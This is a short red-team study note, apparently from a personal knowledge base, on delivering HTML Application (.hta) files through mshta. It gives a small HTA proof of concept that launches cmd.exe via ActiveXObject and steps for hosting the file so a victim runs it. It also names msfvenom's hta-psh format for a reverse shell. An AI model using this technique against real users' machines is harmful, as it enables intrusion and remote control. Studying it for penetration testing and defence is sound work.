---
creation date: April 30th 2023
last modified date: April 30th 2023
aliases: [HTA - hta-psh]
tags: #📕
---

Primary Categories: [[01 - Pentest]] - [[01 - Red Team]]
Secondary Categories:  [[02 - Weaponization]]
Links: [[HTML]] - [[JScript]] - [[VBScript]] - [[LOLBINS]] - [[mshta]]
Search Tag: #📕  

# [[HTML Application]]  
___

## Description:  
This allows us to create downloadable file that takes all the information regarding how it is displayed and rendered. These are dynamic `HTML` pages containing `JScript` & `VBScript`. The LOLBIN tool `mshta` is used on Windows systems to execute the file as the highest trust level.

## Proof of Concept 
- This used **ActiveXObject** to boot up a cmd.exe
```HTML
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```
- We utilize a quick http server using: `python -m http.server 4444`
	- Get the victims machine to navigate to  the webpage on Microsoft Edge and execute the file
- We can also use this to gain a **reverse shell** by generating a payload with `MsfVenom` with a `hta-psh` format and doing the same as above host the file and have the victim download / execute it


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: April 30th 2023 (10:34 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
